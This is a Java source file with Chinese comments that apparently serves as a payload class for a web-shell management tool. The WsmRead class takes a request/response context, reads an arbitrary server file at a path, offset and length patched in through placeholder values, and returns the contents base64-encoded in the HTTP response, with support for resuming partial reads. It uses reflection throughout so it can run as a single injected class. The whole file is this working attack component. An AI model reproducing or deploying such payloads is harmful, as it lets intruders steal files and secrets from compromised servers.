// 文件读取载荷：base64 回传（二进制安全）。
// 约束同 WsmProbe：默认包、全反射、单 class、占位值唯一、零跨类引用。
public class WsmRead {

	public static final String p = "WSMR-P0"; // 文件路径
	public static final String f = "WSMR-F0"; // 起始偏移（空=0——断点续传）
	public static final String n = "WSMR-N0"; // 读取长度（空=读到尾）

	public boolean equals(Object ctx) {
		try {
			java.io.File file = new java.io.File(p);
			java.io.RandomAccessFile ra = new java.io.RandomAccessFile(file, "r");
			long fileLen = ra.length();
			long off = 0;
			if (f != null && f.length() > 0) off = Long.parseLong(f);
			ra.seek(off);
			long total = fileLen - off;
			long want = (n != null && n.length() > 0) ? Long.parseLong(n) : total;
			if (want > total) want = total;
			java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
			byte[] buf = new byte[16384];
			long left = want;
			while (left > 0) {
				int r = ra.read(buf, 0, (int) Math.min(buf.length, left));
				if (r == -1) break;
				bo.write(buf, 0, r);
				left -= r;
			}
			ra.close();
			// 首行元数据（偏移/长度/总长）+ 换行 + base64 体——续传对账用
			write(respOf(ctx), "RANGE " + off + " " + want + " " + fileLen + "\n" + java.util.Base64.getEncoder().encodeToString(bo.toByteArray()));
		} catch (Throwable e) {
			try { write(respOf(ctx), "!ERR " + e); } catch (Throwable ignored) {}
		}
		return true;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 1 ? a[1] : null;
		}
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
